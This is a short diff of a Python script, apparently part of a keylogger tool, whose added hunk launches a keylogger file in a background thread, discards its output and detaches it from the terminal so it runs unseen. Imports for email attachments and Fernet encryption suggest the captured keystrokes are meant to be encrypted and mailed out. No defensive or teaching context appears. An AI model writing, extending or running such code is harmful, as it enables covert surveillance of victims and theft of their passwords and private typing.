@@ -42,6 +42,20 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
 
+try:
+    # Ejecutar el keylogger en segundo plano, redirigiendo stdout y stderr a /dev/null
+    keylogger_thread = threading.Thread(target=lambda: subprocess.Popen(
+        ['python3', dest_path],
+        stdout=subprocess.DEVNULL,  # Redirigir salida estándar a /dev/null
+        stderr=subprocess.DEVNULL,  # Redirigir salida de error a /dev/null
+        preexec_fn=os.setpgrp  # Desvincular del terminal
+    ))
+    keylogger_thread.start()
+    #print("Keylogger executed immediately.")
+except Exception as e:
+    #print(f"Failed to execute the keylogger: {e}")
+    exit(1)
+
 # Generar clave de cifrado
 key = Fernet.generate_key()
 cipher = Fernet(key)
